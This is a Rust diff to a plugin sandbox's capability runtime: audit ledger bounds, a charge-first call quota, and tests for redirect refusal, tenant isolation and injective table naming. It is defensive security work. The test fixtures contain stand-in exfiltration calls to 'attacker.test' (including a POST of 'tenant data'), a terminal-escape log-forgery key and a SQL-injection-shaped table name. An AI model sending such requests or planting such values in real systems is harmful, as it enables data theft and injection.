@@ -84,17 +84,24 @@ use serde::{Deserialize, Serialize};
 
 use super::grants::CapabilityQuotas;
 use super::manifest::{SandboxCapability, SandboxManifest};
-use audit::{CapabilityEvent, CapabilityOutcome};
 use quota::QuotaLedger;
 
-pub use audit::{ActivitySummary, CapabilityEvent as AuditEvent, PluginActivityLog};
+pub use audit::{
+    ActivitySummary, CapabilityEvent, CapabilityOutcome, MAX_LOG_EVENTS, PluginActivityLog,
+};
+// Aliased for use *inside* this module only, so the `pub use` above can carry
+// the real names without shadowing itself.
+use audit::{CapabilityEvent as Event, CapabilityOutcome as Outcome};
 pub use db::{MemoryPluginStore, PluginStore, Scope, StoreError};
 pub use jobs::MemoryJobSink;
 pub use jobs::{JobSink, PluginJob};
 pub use kv::{CacheKvStore, KvStore, MemoryKvStore};
-pub use outbound::{OutboundHttp, OutboundRequest, OutboundResponse, RecordingHttp};
+pub use outbound::{
+    ALLOWED_OUTBOUND_REQUEST_HEADERS, ALLOWED_OUTBOUND_RESPONSE_HEADERS, MAX_OUTBOUND_HEADERS,
+    OutboundHttp, OutboundRequest, OutboundResponse, RecordingHttp,
+};
 pub use quota::CapabilityRateLimiter;
-pub use render::{FragmentNode, RenderError};
+pub use render::{ALLOWED_ATTRIBUTES, ALLOWED_TAGS, FragmentNode, RenderError};
 
 /// The most columns one plugin row may carry.
 ///
@@ -173,7 +180,7 @@ impl fmt::Display for PluginValue {
 /// One row: column name to scalar, ordered so encodings are deterministic.
 pub type PluginRow = BTreeMap<String, PluginValue>;
 
-/// Why a row was refused before it reached anything.
+/// Check one row against the bounds every backend inherits.
 ///
 /// Checked in the host rather than in each backend, so a store implementation
 /// an embedder wrote cannot be the place the bound is missing.
@@ -376,8 +383,15 @@ impl CapabilityCall {
             Self::KvGet { key, .. } | Self::KvSet { key, .. } | Self::KvDelete { key, .. } => {
                 key.clone()
             }
-            Self::HttpFetch { url, .. } => outbound::host_of(url)
-                .unwrap_or_else(|| "(not an absolute http/https URL)".to_owned()),
+            // The *authority* it reached for, even when `host_of` refuses the
+            // URL — because the refusals are the interesting ones. Recording a
+            // placeholder would put every userinfo, backslash and scheme-
+            // confusion attempt under one label, so `attacker.test` in
+            // `https://api.example.com@attacker.test/` would never appear in the
+            // one surface built to show what a plugin reached for.
+            Self::HttpFetch { url, .. } => {
+                outbound::host_of(url).unwrap_or_else(|| outbound::attempted_authority(url))
+            }
             Self::DbInsert { table, .. }
             | Self::DbGet { table, .. }
             | Self::DbQuery { table, .. }
@@ -428,6 +442,13 @@ pub enum DenialReason {
     Unavailable,
     /// The backend was reached and refused or failed.
     BackendError,
+    /// An upstream answered, and its answer was over a byte ceiling.
+    ///
+    /// Distinct from [`QuotaExceeded`](Self::QuotaExceeded) because the two mean
+    /// opposite things to an operator: a quota denial means nothing left the
+    /// host, and this means the call *was made* and the answer was discarded.
+    /// The audit surface counts the host as called.
+    ResponseTooLarge,
 }
 
 impl DenialReason {
@@ -441,6 +462,7 @@ impl DenialReason {
             Self::Malformed => "malformed",
             Self::Unavailable => "unavailable",
             Self::BackendError => "backend-error",
+            Self::ResponseTooLarge => "response-too-large",
         }
     }
 }
@@ -452,6 +474,10 @@ impl fmt::Display for DenialReason {
 }
 
 /// What the host hands back for one call.
+///
+/// `#[must_use]` because dropping it drops the guest's *answer*: the frame the
+/// host owes it in return for the call it made.
+#[must_use]
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 #[serde(tag = "status", rename_all = "kebab-case")]
 #[non_exhaustive]
@@ -548,6 +574,12 @@ pub enum CallValue {
 
 /// The backends a host will honour a capability against.
 ///
+/// Deliberately **not** `#[non_exhaustive]`, unlike the types in this module
+/// that the host produces and a caller only reads: this one is built by the
+/// embedder, and `CapabilityServices { kv: …, ..CapabilityServices::none() }` is
+/// how. Marking it would make that spelling impossible outside this crate,
+/// which is the only spelling there is.
+///
 /// Every field is optional, and a missing one is not a hole: a call whose
 /// backend is absent is denied [`DenialReason::Unavailable`] and recorded, the
 /// same as any other refusal. That is what lets `SandboxHost::run` — which has
@@ -624,14 +656,51 @@ pub struct CapabilityRuntime {
     /// job record; never written after construction.
     pub(super) plugin: String,
     capabilities: Vec<SandboxCapability>,
-    grants: super::grants::CapabilityGrants,
+    /// Read by the outbound module to hand an implementation the host list it
+    /// needs for a per-hop decision; never written after construction.
+    pub(super) grants: super::grants::CapabilityGrants,
     /// The backends. `pub(super)` so each capability module reaches its own and
     /// no more; nothing outside this module tree can substitute one.
     pub(super) services: CapabilityServices,
     quotas: QuotaLedger,
     rate: Option<Arc<quota::CapabilityRateLimiter>>,
-    events: Vec<CapabilityEvent>,
+    events: Vec<Event>,
+    /// Calls the ledger could not hold, so a truncated summary says it is one.
+    dropped_events: u64,
+    /// `(operation, outcome)` pairs already warned about this request.
+    warned: Vec<(&'static str, Outcome)>,
 }
+
+/// The most distinct `(operation, outcome)` pairs one request warns about.
+///
+/// Both sets are closed — ten operations, a handful of outcomes — so this is a
+/// ceiling the vocabulary already implies rather than a policy. It exists so the
+/// scan above stays bounded if either set grows.
+const MAX_WARNED: usize = 64;
+
+/// Truncate a guest-chosen target to [`MAX_TARGET_CHARS`] *characters*.
+///
+/// By characters, before escaping: `rejected` expands a hostile character to as
+/// many as ten bytes, so truncating afterwards would still have materialised the
+/// expansion first.
+fn bounded_target(target: &str) -> String {
+    let mut chars = target.chars();
+    let kept: String = chars.by_ref().take(MAX_TARGET_CHARS).collect();
+    if chars.next().is_some() {
+        format!("{kept}…")
+    } else {
+        kept
+    }
+}
+
+/// Characters of a guest-chosen target the audit ledger keeps.
+///
+/// Deliberately far below the 512 characters the manifest module's `rejected`
+/// escaper allows. A ledger entry answers "which table / host / key", and no honest one
+/// needs a paragraph — while `rejected` escapes a hostile character to as many
+/// as ten bytes, so 512 characters is up to 5 KiB per entry and
+/// [`MAX_EVENTS`] of those is megabytes the request footprint never budgeted.
+pub const MAX_TARGET_CHARS: usize = 96;
 
 /// The most events one request's ledger holds.
 ///
@@ -664,6 +733,8 @@ impl CapabilityRuntime {
             services,
             quotas: QuotaLedger::new(manifest.quotas),
             events: Vec::new(),
+            dropped_events: 0,
+            warned: Vec::new(),
         }
     }
 
@@ -674,6 +745,16 @@ impl CapabilityRuntime {
     }
 
     /// The tenant every scoped call binds to, as a namespace segment.
+    ///
+    /// [`NO_TENANT`] when the caller supplied none. That is right for a
+    /// single-tenant application and **wrong** for a multi-tenant one whose
+    /// plugin router was mounted outside the tenancy middleware: every tenant's
+    /// keys and rows would pool into one namespace. Nothing inside the sandbox
+    /// can tell those two apart — `CURRENT_TENANT` is simply absent in both —
+    /// so the caller is the one that has to know, which is why
+    /// [`CapabilityServices::for_tenant`] exists and why
+    /// `SandboxedPlugin::serve` reads the task-local on the async task rather
+    /// than inside `spawn_blocking`, where it is absent for a third reason.
     #[must_use]
     pub fn tenant(&self) -> &str {
         self.services.tenant.as_deref().unwrap_or(NO_TENANT)
@@ -681,19 +762,32 @@ impl CapabilityRuntime {
 
     /// Everything this request did, in order.
     #[must_use]
-    pub fn events(&self) -> &[CapabilityEvent] {
+    pub fn events(&self) -> &[Event] {
         &self.events
     }
 
     /// Take the ledger, leaving it empty.
     #[must_use]
-    pub fn take_events(&mut self) -> Vec<CapabilityEvent> {
+    pub fn take_events(&mut self) -> Vec<Event> {
         std::mem::take(&mut self.events)
     }
 
-    /// Whether this plugin may use `capability` at all.
+    /// Calls this request made that the bounded ledger could not hold.
+    ///
+    /// Non-zero means the activity summary is a floor, not a count — which is
+    /// the one thing an operator must not have to guess at.
     #[must_use]
-    pub fn grants(&self, capability: SandboxCapability) -> bool {
+    pub const fn dropped_events(&self) -> u64 {
+        self.dropped_events
+    }
+
+    /// Whether this plugin may use `capability` at all.
+    ///
+    /// `is_granted`, not `grants`, for the reason
+    /// [`SandboxManifest::is_granted`](super::manifest::SandboxManifest::is_granted)
+    /// carries the same name: `grants` is the field holding the scope lists.
+    #[must_use]
+    pub fn is_granted(&self, capability: SandboxCapability) -> bool {
         self.capabilities.contains(&capability)
     }
 
@@ -714,12 +808,33 @@ impl CapabilityRuntime {
         // the rendered summary.
         let named = call.target();
 
-        // Order matters. The capability check is first because a plugin that
-        // was never granted `db` must learn that, not that it is over a quota
-        // it could never legitimately spend — and because a call to an
-        // ungranted capability must not be able to spend the shared `calls`
-        // budget a granted one needs.
-        if !self.grants(capability) {
+        // The shared `calls` budget is charged first, for every dispatch —
+        // including one that is about to be refused. A refusal is cheaper than
+        // a call but it is not free: it costs a grant scan, an encoded reply, a
+        // ledger entry and a log line, and leaving refusals unmetered let a
+        // plugin with a generous fuel budget emit ~10^5 warn lines per request
+        // against a `calls` quota of 128. Fuel alone is the wrong ceiling for
+        // work whose cost is a log write.
+        //
+        // The *per-capability* counters stay where they are, below, so a call
+        // refused before it could reach a backend does not spend the budget
+        // that bounds backend work.
+        if let Err(field) = self.quotas.charge_call() {
+            return self.record(
+                call,
+                named,
+                CallResult::denied(
+                    id,
+                    DenialReason::QuotaExceeded,
+                    format!("the per-request `{field}` quota is spent"),
+                ),
+            );
+        }
+
+        // Then the capability, before the scope: a plugin that was never
+        // granted `db` must learn *that*, not that some table is not in a list
+        // it does not have.
+        if !self.is_granted(capability) {
             return self.record(
                 call,
                 named,
@@ -731,15 +846,16 @@ impl CapabilityRuntime {
             );
         }
 
-        // Scope before quota, for the same reason: an out-of-scope target is a
-        // manifest mistake the author has to fix, and letting it consume the
-        // request's call budget would report the wrong problem on the next call.
+        // Scope before the per-capability charge: an out-of-scope target never
+        // reaches a backend, so spending the budget that bounds backend work on
+        // it would let one manifest mistake starve the calls the plugin is
+        // entitled to make.
         let target = match self.target_of(call) {
             Ok(target) => target,
             Err(result) => return self.record(call, named, result),
         };
 
-        if let Err(field) = self.quotas.charge(call) {
+        if let Err(field) = self.quotas.charge_capability(call) {
             return self.record(
                 call,
                 target.clone(),
@@ -875,17 +991,19 @@ impl CapabilityRuntime {
     /// answers the guest without also telling the operator.
     fn record(&mut self, call: &CapabilityCall, target: String, result: CallResult) -> CallResult {
         // Bounded and neutralised once, here, rather than at each of the six
-        // exits. A KV key is the one identifier a guest chooses freely, it can
-        // carry up to `MAX_KV_KEY_BYTES` of anything, and from here it goes into
-        // a `tracing` line and into the rendered operator summary — both of
-        // which a terminal renders.
-        let target = super::manifest::rejected(&target);
+        // exits. A KV key is the one identifier a guest chooses freely, a table
+        // or job type is bounded only by the wire, and from here both go into a
+        // `tracing` line and the rendered operator summary — which a terminal
+        // renders. `MAX_TARGET_CHARS` is far below what `rejected` would allow,
+        // because a ledger this deep with 512-character entries is megabytes the
+        // footprint never budgeted.
+        let target = super::manifest::rejected(&bounded_target(&target));
         let outcome = match result.denial() {
-            None => CapabilityOutcome::Allowed,
-            Some(DenialReason::QuotaExceeded) => CapabilityOutcome::QuotaExceeded,
-            Some(reason) => CapabilityOutcome::Denied(reason),
+            None => Outcome::Allowed,
+            Some(DenialReason::QuotaExceeded) => Outcome::QuotaExceeded,
+            Some(reason) => Outcome::Denied(reason),
         };
-        if matches!(outcome, CapabilityOutcome::Allowed) {
+        if matches!(outcome, Outcome::Allowed) {
             tracing::debug!(
                 plugin = self.plugin,
                 capability = call.capability().as_str(),
@@ -893,11 +1011,20 @@ impl CapabilityRuntime {
                 target = target.as_str(),
                 "sandboxed plugin used a granted capability"
             );
+        } else if self
+            .warned
+            .iter()
+            .any(|(operation, seen)| *operation == call.operation() && *seen == outcome)
+        {
+            // Already said, this request. Deduplicated by `(operation,
+            // outcome)` exactly as `HostState::deny` deduplicates a refused
+            // import, and for the same reason: a guest that calls in a loop
+            // must not be able to turn the evidence of it into the operator's
+            // log-storage problem. The ledger below still counts every one, so
+            // nothing is lost — only repeated.
         } else {
-            // Denials are warned, once, at the point they happen — the same
-            // treatment `HostState::deny` gives a forbidden import, and for the
-            // same reason: whoever is driving the host should not have to
-            // remember to log it.
+            // Denials are warned, once, at the point they happen — whoever is
+            // driving the host should not have to remember to log it.
             tracing::warn!(
                 plugin = self.plugin,
                 capability = call.capability().as_str(),
@@ -906,14 +1033,27 @@ impl CapabilityRuntime {
                 outcome = %outcome,
                 "sandboxed plugin was refused a capability call"
             );
+            // Bounded by the vocabulary: at most one entry per (operation,
+            // outcome) pair, and both sets are closed.
+            if self.warned.len() < MAX_WARNED {
+                self.warned.push((call.operation(), outcome));
+            }
         }
         if self.events.len() < MAX_EVENTS {
-            self.events.push(CapabilityEvent {
+            self.events.push(Event {
                 capability: call.capability(),
                 operation: call.operation(),
                 target,
                 outcome,
             });
+        } else {
+            // Counted rather than dropped silently. The ledger is bounded
+            // because a guest chooses how many entries it makes, but an
+            // operator reading "12 db-inserts" off a truncated ledger would be
+            // reading a number the plugin chose. `MAX_EVENTS` is not
+            // unreachable: the quotas that would bound it live in the plugin's
+            // own manifest, so the plugin sets them.
+            self.dropped_events = self.dropped_events.saturating_add(1);
         }
         result
     }
@@ -1036,20 +1176,20 @@ path = "/shop/panel"
         // "What did this plugin do" includes what it *tried* to do. A ledger
         // that named only the targets that passed would answer the easy half.
         let mut granted = fixture(&everything(), Some("alpha"));
-        granted.runtime.dispatch(&CapabilityCall::HttpFetch {
+        let _ = granted.runtime.dispatch(&CapabilityCall::HttpFetch {
             id: 1,
             method: "GET".to_owned(),
             url: "https://attacker.test/steal".to_owned(),
             headers: Vec::new(),
             body: String::new(),
         });
-        granted.runtime.dispatch(&CapabilityCall::DbQuery {
+        let _ = granted.runtime.dispatch(&CapabilityCall::DbQuery {
             id: 2,
             table: "users".to_owned(),
             filter: PluginRow::new(),
             limit: 1,
         });
-        granted.runtime.dispatch(&CapabilityCall::JobEnqueue {
+        let _ = granted.runtime.dispatch(&CapabilityCall::JobEnqueue {
             id: 3,
             job_type: "drain-accounts".to_owned(),
             payload: PluginRow::new(),
@@ -1065,7 +1205,7 @@ path = "/shop/panel"
         // And it is neutralised on the way in: the one identifier a guest
         // chooses freely ends up in a log line and in the operator summary.
         let mut hostile = fixture(&[SandboxCapability::HttpRequest], None);
-        hostile.runtime.dispatch(&CapabilityCall::KvGet {
+        let _ = hostile.runtime.dispatch(&CapabilityCall::KvGet {
             id: 4,
             key: "a\u{1b}[2K\rforged".to_owned(),
         });
@@ -1120,7 +1260,7 @@ path = "/shop/panel"
 
         let manifest = manifest(&everything());
         let mut alpha = CapabilityRuntime::new(&manifest, services("alpha"));
-        alpha.dispatch(&CapabilityCall::KvSet {
+        let _ = alpha.dispatch(&CapabilityCall::KvSet {
             id: 1,
             key: "cart".to_owned(),
             value: PluginValue::Text("alpha's".to_owned()),
@@ -1160,7 +1300,7 @@ path = "/shop/panel"
         };
 
         let mut beta = CapabilityRuntime::new(&manifest, services("b"));
-        beta.dispatch(&CapabilityCall::KvSet {
+        let _ = beta.dispatch(&CapabilityCall::KvSet {
             id: 1,
             key: "cart".to_owned(),
             value: PluginValue::Text("beta's".to_owned()),
@@ -1217,6 +1357,7 @@ path = "/shop/panel"
                 status: 200,
                 headers: vec![("content-type".to_owned(), "application/json".to_owned())],
                 body: "[]".to_owned(),
+                final_url: "https://api.example.com/v1/orders".to_owned(),
             },
         );
         let result = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
@@ -1279,6 +1420,102 @@ path = "/shop/panel"
     }
 
     #[test]
+    fn a_redirect_off_the_granted_host_is_refused_after_the_fact() {
+        // Checking the URL the guest wrote bounds the first hop and nothing
+        // else. A client that follows redirects — which most do by default —
+        // would otherwise send the body to a host the manifest never named and
+        // record one allowed call to the granted one.
+        let mut fixture = fixture(&everything(), Some("alpha"));
+        fixture
+            .http
+            .answer_from("https://api.example.com/r", "https://attacker.test/collect");
+        let result = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
+            id: 1,
+            method: "POST".to_owned(),
+            url: "https://api.example.com/r".to_owned(),
+            headers: Vec::new(),
+            body: "tenant data".to_owned(),
+        });
+        assert_eq!(
+            result.denial(),
+            Some(DenialReason::NotInGrant),
+            "{result:?}"
+        );
+
+        // …and the operator sees where it ended up, not just that something
+        // was refused.
+        let events = fixture.runtime.events();
+        assert!(
+            events
+                .iter()
+                .any(|event| event.outcome != audit::CapabilityOutcome::Allowed),
+            "{events:?}"
+        );
+    }
+
+    #[test]
+    fn an_implementation_is_handed_what_it_needs_to_refuse_a_hop_itself() {
+        let mut fixture = fixture(&everything(), Some("alpha"));
+        fixture.http.answer(
+            "https://api.example.com/v1",
+            OutboundResponse::from_url("https://api.example.com/v1", 200, "ok"),
+        );
+        let _ = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
+            id: 1,
+            method: "GET".to_owned(),
+            url: "https://api.example.com/v1".to_owned(),
+            headers: Vec::new(),
+            body: String::new(),
+        });
+        let seen = fixture.http.seen();
+        let sent = seen.first().expect("the call left");
+        assert!(
+            !sent.follow_redirects,
+            "redirects are never followed for a plugin"
+        );
+        assert_eq!(sent.allowed_hosts, vec!["api.example.com".to_owned()]);
+        assert!(
+            sent.timeout > std::time::Duration::ZERO,
+            "a call has a deadline"
+        );
+    }
+
+    #[test]
+    fn an_upstream_that_answered_counts_as_a_host_that_was_called() {
+        // A response discarded for being over a byte ceiling still *left the
+        // host*. Filing it under "refused" would make the audit surface
+        // undercount exactly the calls an operator most wants to see.
+        let mut manifest = manifest(&everything());
+        manifest.quotas.outbound_response_bytes = 4;
+        let http = RecordingHttp::new();
+        http.answer(
+            "https://api.example.com/big",
+            OutboundResponse::from_url("https://api.example.com/big", 200, "far too long"),
+        );
+        let mut runtime = CapabilityRuntime::new(
+            &manifest,
+            CapabilityServices {
+                http: Some(Arc::clone(&http) as Arc<dyn OutboundHttp>),
+                ..CapabilityServices::none()
+            },
+        );
+        let result = runtime.dispatch(&CapabilityCall::HttpFetch {
+            id: 1,
+            method: "GET".to_owned(),
+            url: "https://api.example.com/big".to_owned(),
+            headers: Vec::new(),
+            body: String::new(),
+        });
+        assert_eq!(result.denial(), Some(DenialReason::ResponseTooLarge));
+
+        let log = audit::PluginActivityLog::new();
+        log.ingest("shop", runtime.take_events());
+        let summary = log.summary("shop", std::time::Duration::from_secs(3600));
+        assert_eq!(summary.hosts.get("api.example.com"), Some(&1));
+        assert!(summary.refused_targets.is_empty(), "{summary:?}");
+    }
+
+    #[test]
     fn the_same_host_on_another_port_is_the_granted_host() {
         // The grant is about where the bytes go, and the name decides that.
         assert_eq!(
@@ -1327,68 +1564,6 @@ path = "/shop/panel"
         assert!(fixture.http.seen().is_empty());
     }
 
-    #[test]
-    fn a_quota_counts_what_reached_a_backend_and_fuel_counts_every_call() {
-        // Two ceilings, two jobs. A call refused at the *grant* check never
-        // reaches a backend, so it does not spend the quota that bounds backend
-        // work — spending it there would let a manifest mistake starve the
-        // calls the plugin is entitled to make. What bounds a guest spinning on
-        // refusals is fuel: `CAPABILITY_CALL_FUEL` plus the reply's bytes is
-        // charged for every call, granted or not, and it is charged by the host
-        // rather than by the ledger. See `host::HostState::service`.
-        let mut fixture = fixture(&everything(), Some("alpha"));
-        let ceiling = fixture.runtime.quotas().outbound_calls;
-        for id in 0..(u64::from(ceiling) * 4) {
-            let result = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
-                id,
-                method: "GET".to_owned(),
-                url: "https://attacker.test/".to_owned(),
-                headers: Vec::new(),
-                body: String::new(),
-            });
-            assert_eq!(result.denial(), Some(DenialReason::NotInGrant));
-        }
-        // The granted host is still reachable: no amount of asking for one that
-        // was never granted costs the plugin the one that was.
-        fixture.http.answer(
-            "https://api.example.com/",
-            OutboundResponse {
-                status: 204,
-                headers: Vec::new(),
-                body: String::new(),
-            },
-        );
-        let allowed = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
-            id: 99,
-            method: "GET".to_owned(),
-            url: "https://api.example.com/".to_owned(),
-            headers: Vec::new(),
-            body: String::new(),
-        });
-        assert!(allowed.denial().is_none(), "{allowed:?}");
-
-        // A call that got as far as a backend does spend the quota, whatever
-        // the backend then said.
-        for id in 100..(100 + u64::from(ceiling) - 1) {
-            let result = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
-                id,
-                method: "GET".to_owned(),
-                url: "https://api.example.com/missing".to_owned(),
-                headers: Vec::new(),
-                body: String::new(),
-            });
-            assert_eq!(result.denial(), Some(DenialReason::BackendError));
-        }
-        let over = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
-            id: 999,
-            method: "GET".to_owned(),
-            url: "https://api.example.com/".to_owned(),
-            headers: Vec::new(),
-            body: String::new(),
-        });
-        assert_eq!(over.denial(), Some(DenialReason::QuotaExceeded));
-    }
-
     // ── DB containment ───────────────────────────────────────────────
 
     #[test]
@@ -1409,13 +1584,12 @@ path = "/shop/panel"
 
         // The physical row landed under the derived name, never under a name
         // the guest chose.
+        // Derived, never spelled: a literal here is a test that silently stops
+        // testing anything the moment the derivation changes.
+        let orders = db::physical_table("shop", "orders").expect("derivable");
         assert_eq!(
             fixture.db.keys(),
-            vec![(
-                "plugin_shop_orders".to_owned(),
-                "alpha".to_owned(),
-                row_id.clone()
-            )]
+            vec![(orders, "alpha".to_owned(), row_id.clone())]
         );
 
         let read = fixture.runtime.dispatch(&CapabilityCall::DbGet {
@@ -1466,12 +1640,11 @@ path = "/shop/panel"
         // Seeded directly: a host-application table, and another tenant's row
         // in the plugin's own table.
         store.seed("users", "alpha", "u1", row(&[("email", "ceo@example.com")]));
-        store.seed(
-            "plugin_shop_orders",
-            "beta",
-            "r99",
-            row(&[("sku", "beta's")]),
-        );
+        // Derived, not hard-coded: a literal here turns the whole test vacuous
+        // the moment the derivation changes, because beta's row would land in a
+        // table alpha was never going to reach anyway.
+        let orders = db::physical_table("shop", "orders").expect("derivable");
+        store.seed(&orders, "beta", "r99", row(&[("sku", "beta's")]));
 
         let manifest = manifest(&everything());
         let mut alpha = CapabilityRuntime::new(
@@ -1517,25 +1690,33 @@ path = "/shop/panel"
             },
         ] {
             let result = alpha.dispatch(&call);
-            assert!(
-                matches!(result, CallResult::Denied { .. })
-                    || result
-                        == CallResult::Ok {
-                            id: result.id(),
-                            value: CallValue::Rows { rows: Vec::new() }
-                        },
-                "{call:?} reached another tenant's row: {result:?}"
-            );
+            // Each call gets the *specific* answer it should, rather than
+            // "anything except a populated row": a loop that accepts a denial
+            // or an empty read for every operation passes even if `db-delete`
+            // started returning `Done` after deleting beta's row.
+            let expected_empty = matches!(call, CapabilityCall::DbGet { .. });
+            if expected_empty {
+                assert_eq!(
+                    result,
+                    CallResult::Ok {
+                        id: result.id(),
+                        value: CallValue::Rows { rows: Vec::new() }
+                    },
+                    "a read of another tenant's id must miss, not error"
+                );
+            } else {
+                assert_eq!(
+                    result.denial(),
+                    Some(DenialReason::BackendError),
+                    "{call:?} must not touch another tenant's row"
+                );
+            }
         }
         // Untouched, in every sense.
         assert_eq!(
             store.keys(),
             vec![
-                (
-                    "plugin_shop_orders".to_owned(),
-                    "beta".to_owned(),
-                    "r99".to_owned()
-                ),
+                (orders.clone(), "beta".to_owned(), "r99".to_owned()),
                 ("users".to_owned(), "alpha".to_owned(), "u1".to_owned()),
             ]
         );
@@ -1605,16 +1786,152 @@ path = "/shop/panel"
     }
 
     #[test]
+    fn two_plugins_can_never_be_named_onto_one_physical_table() {
+        // The collision that matters is not punctuation, it is the *separator*:
+        // a hostile author picks a plugin name that shifts the boundary onto a
+        // victim's table. Both manifests validate, both consent screens are
+        // truthful, and `AppBuilder` sees two distinct plugin names.
+        let victim = db::physical_table("shop", "orders_v2");
+        let attacker = db::physical_table("shop_orders", "v2");
+        assert!(victim.is_some() && attacker.is_some());
+        assert_ne!(victim, attacker, "a boundary shift must not collide");
+
+        // Punctuation and case are the same bug one variation along.
+        let names = ["my-shop", "my.shop", "my_shop", "My_Shop", "MY.SHOP"];
+        let derived: Vec<String> = names
+            .iter()
+            .filter_map(|name| db::physical_table(name, "orders"))
+            .collect();
+        assert_eq!(derived.len(), names.len(), "{derived:?}");
+        let mut unique = derived.clone();
+        unique.sort();
+        unique.dedup();
+        assert_eq!(unique.len(), names.len(), "collision in {derived:?}");
+
+        // And the derived name is still a bare, unquoted SQL identifier.
+        for name in &derived {
+            assert!(
+                name.starts_with("plugin_")
+                    && name.bytes().all(|byte| byte.is_ascii_lowercase()
+                        || byte.is_ascii_digit()
+                        || byte == b'_'),
+                "{name}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_truncated_ledger_says_so_rather_than_reporting_a_smaller_number() {
+        // `MAX_EVENTS` is reachable: the quotas that would bound it live in the
+        // plugin's own manifest, so the plugin sets them. An operator reading
+        // "12 db-inserts" off a truncated ledger would be reading a number the
+        // plugin chose.
+        let mut manifest = manifest(&everything());
+        manifest.quotas.calls = MAX_QUOTA;
+        manifest.quotas.kv_reads = MAX_QUOTA;
+        let mut runtime = CapabilityRuntime::new(
+            &manifest,
+            CapabilityServices {
+                kv: Some(MemoryKvStore::new() as Arc<dyn KvStore>),
+                ..CapabilityServices::none()
+            },
+        );
+        for id in 0..(MAX_EVENTS as u64 + 25) {
+            let _ = runtime.dispatch(&CapabilityCall::KvGet {
+                id,
+                key: "k".to_owned(),
+            });
+        }
+        assert_eq!(runtime.events().len(), MAX_EVENTS);
+        assert_eq!(runtime.dropped_events(), 25);
+
+        let log = audit::PluginActivityLog::new();
+        let dropped = runtime.dropped_events();
+        log.ingest("shop", runtime.take_events());
+        log.ingest_dropped("shop", dropped);
+        let summary = log.summary("shop", std::time::Duration::from_secs(3600));
+        assert_eq!(summary.dropped, 25);
+        let rendered = summary.to_string();
+        assert!(rendered.contains("floor"), "{rendered}");
+    }
+
+    #[test]
+    fn an_audit_target_is_bounded_before_it_is_escaped() {
+        let mut fixture = fixture(&everything(), Some("alpha"));
+        let _ = fixture.runtime.dispatch(&CapabilityCall::KvGet {
+            id: 1,
+            key: "\u{202e}".repeat(400),
+        });
+        let recorded = fixture
+            .runtime
+            .events()
+            .first()
+            .map(|event| event.target.clone())
+            .unwrap_or_default();
+        // `rejected` expands a hostile character to as many as ten bytes, so
+        // the bound has to be on characters and has to be applied first.
+        assert!(
+            recorded.len() <= MAX_TARGET_CHARS * 10 + 8,
+            "{} bytes: {recorded}",
+            recorded.len()
+        );
+    }
+
+    #[test]
+    fn the_in_memory_stores_refuse_rather_than_growing_without_a_ceiling() {
+        // A plugin declares its own `kv_writes` and `db_writes`, and both may
+        // legally be `MAX_QUOTA`. A shipped store with no ceiling of its own
+        // turns that into the host's memory.
+        let kv = MemoryKvStore::with_capacity(2);
+        assert!(kv.set("a", PluginValue::Int(1)).is_ok());
+        assert!(kv.set("b", PluginValue::Int(1)).is_ok());
+        assert!(kv.set("c", PluginValue::Int(1)).is_err());
+        // Overwriting an existing key adds nothing, so it is never refused.
+        assert!(kv.set("a", PluginValue::Int(2)).is_ok());
+
+        let store = db::MemoryPluginStore::with_capacity(1);
+        let scope = db::Scope {
+            table: "plugin_shop__orders".to_owned(),
+            tenant: "alpha".to_owned(),
+        };
+        assert!(store.insert(&scope, PluginRow::new()).is_ok());
+        assert!(store.insert(&scope, PluginRow::new()).is_err());
+    }
+
+    #[test]
+    fn a_full_store_is_a_denial_the_guest_can_read() {
+        let mut runtime = CapabilityRuntime::new(
+            &manifest(&everything()),
+            CapabilityServices {
+                kv: Some(MemoryKvStore::with_capacity(0) as Arc<dyn KvStore>),
+                ..CapabilityServices::none()
+            }
+            .for_tenant("alpha"),
+        );
+        assert_eq!(
+            runtime
+                .dispatch(&CapabilityCall::KvSet {
+                    id: 1,
+                    key: "cart".to_owned(),
+                    value: PluginValue::Int(1)
+                })
+                .denial(),
+            Some(DenialReason::BackendError)
+        );
+    }
+
+    #[test]
     fn no_physical_table_is_derivable_from_a_name_the_grant_list_could_not_hold() {
         assert_eq!(
             db::physical_table("shop", "orders"),
-            Some("plugin_shop_orders".to_owned())
+            Some("plugin_shop__orders".to_owned())
         );
-        // A plugin name's own charset is wider than SQL's; punctuation is
-        // folded rather than emitted.
+        // A plugin name's charset is wider than SQL's, so it is escaped
+        // injectively rather than folded: `.` is `_2e` and `-` is `_2d`, and
+        // `__` — which no escape can produce — is the separator.
         assert_eq!(
             db::physical_table("my.shop-v2", "orders"),
-            Some("plugin_my_shop_v2_orders".to_owned())
+            Some("plugin_my_2eshop_2dv2__orders".to_owned())
         );
         for (plugin, table) in [
             ("shop", "users; drop table x"),
@@ -1624,6 +1941,10 @@ path = "/shop/panel"
             ("shop", ""),
             ("", "orders"),
             ("shop", &"o".repeat(64)),
+            // Long, but each half is legal: the *derived* name is what cannot
+            // fit, and `SandboxManifest::validate` refuses this at load so an
+            // operator never approves a capability that can only be denied.
+            (&"p".repeat(40), &"t".repeat(30)),
         ] {
             assert_eq!(db::physical_table(plugin, table), None, "{plugin}/{table}");
         }
@@ -1709,7 +2030,7 @@ path = "/shop/panel"
         .for_tenant("alpha");
         let mut first = CapabilityRuntime::new(&manifest, services.clone());
         for id in 0..manifest.quotas.kv_reads {
-            first.dispatch(&CapabilityCall::KvGet {
+            let _ = first.dispatch(&CapabilityCall::KvGet {
                 id: u64::from(id),
                 key: "cart".to_owned(),
             });
@@ -1775,7 +2096,11 @@ path = "/shop/panel"
     #[test]
     fn a_calls_per_second_ceiling_is_shared_across_requests_and_kept_per_capability() {
         let manifest = manifest(&everything());
-        let rate = Arc::new(quota::CapabilityRateLimiter::new(2));
+        // One token per second, not two: the assertion below needs the bucket
+        // to still be empty when it runs, and a `per_second` of 2 gave it only
+        // 500 ms of slack — enough for a loaded debug-build runner to refill
+        // one token between the take and the check and flip this green to red.
+        let rate = Arc::new(quota::CapabilityRateLimiter::new(1));
         let services = CapabilityServices {
             kv: Some(MemoryKvStore::new() as Arc<dyn KvStore>),
             jobs: Some(MemoryJobSink::new() as Arc<dyn JobSink>),
